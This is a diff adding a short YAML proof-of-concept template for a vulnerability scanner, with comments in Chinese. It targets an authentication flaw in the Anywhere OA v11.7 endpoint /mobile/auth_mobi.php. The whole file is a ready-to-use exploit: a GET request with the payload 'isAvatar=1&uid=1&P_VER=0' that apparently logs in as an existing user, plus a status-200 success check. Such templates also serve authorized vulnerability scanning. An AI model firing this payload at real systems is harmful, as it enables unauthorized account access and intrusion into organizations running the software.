@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "AnywhereOA_v11.7_auth_mobi.php_online_user_login"
+
+#请求方式
+- method:
+  - method: "get"
+
+#漏洞的位置
+- url:
+  - url : "/mobile/auth_mobi.php"
+
+#payload
+- payload:
+  - payload: 'isAvatar=1&uid=1&P_VER=0'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#response包里的关键字
+- word:
+  - word:
+      - ""
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
